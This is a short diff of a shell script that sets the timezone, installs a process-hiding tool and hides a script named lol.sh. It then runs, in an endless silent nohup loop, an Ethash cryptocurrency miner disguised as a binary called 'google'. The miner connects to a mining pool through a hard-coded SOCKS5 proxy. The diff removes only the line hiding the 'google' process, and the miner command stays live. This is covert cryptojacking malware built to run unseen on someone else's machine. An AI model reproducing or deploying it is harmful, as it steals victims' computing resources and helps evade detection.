@@ -9,7 +9,6 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 ph add lol.sh
-ph add google
 sleep 14
 while [ 1 ]; do
 nohup ./google --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user thunder0x.$(echo $(shuf -i 1-99999 -n 1)-T4) --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 60 &> /dev/null
